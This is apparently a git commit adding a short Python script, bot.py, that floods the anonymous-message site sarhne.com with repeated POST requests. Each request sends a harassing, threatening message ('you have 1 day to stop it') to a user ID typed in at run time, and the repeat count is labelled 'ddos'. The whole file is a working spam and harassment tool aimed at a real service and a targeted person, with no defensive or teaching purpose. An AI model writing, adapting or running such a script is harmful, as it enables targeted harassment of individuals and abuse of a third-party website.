697580badec95c486fcb174903fc0c36b01bcdde
Hamzaoui <muhmd.hmzaoui@gmail.com>
2022-02-04 14:49:29 +0100

    test

---
+++ bot.py
@@ -0,0 +1,38 @@
+import requests
+import threading
+url = "https://www.sarhne.com/ajax/messages/send.html"
+id = ""
+def post():
+   #msg=this+test+all+opppp&show_my_info=on&img_code=&link=103961398130919630158&bad_words=false&i=null
+    myobj = {'msg': 'stop making bullshits and focus on your dreams you have 1 day to stop it ISIGK have a nice day ^ufo^  :)',
+    'show_my_info':'on',
+    'img_code':'',
+    'link':str(id),  #id of user
+    'bad_words':'false',
+    'i':'null'
+    }
+    x = requests.post(url, data = myobj)
+
+  
+    print(x.text)
+
+def start(ddos):
+    threads = []
+    for i in range(ddos):
+        t=threading.Thread(target=post())
+        t.daemon = True 
+        threads.append(t)
+
+    for i in range(ddos):
+        threads[i].start()
+
+    for i in range(ddos):
+        threads[i].join()
+
+
+id = input('Enter ID : ')
+sp = int(input("Enter Spam Number : "))
+start(sp)
+
+    
+
